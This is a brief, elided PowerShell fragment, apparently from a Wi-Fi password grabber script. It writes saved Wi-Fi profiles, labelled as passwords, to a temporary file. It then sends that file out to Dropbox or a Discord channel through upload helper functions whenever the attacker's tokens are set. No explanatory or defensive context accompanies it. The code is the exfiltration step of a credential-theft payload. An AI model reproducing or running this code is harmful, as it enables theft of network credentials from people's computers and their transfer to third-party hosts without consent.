...
$wifiProfiles > $env:TEMP/--wifi-password.txt
...
if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TEMP/--wifi-password.txt}
...
if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/--wifi-password.txt"}
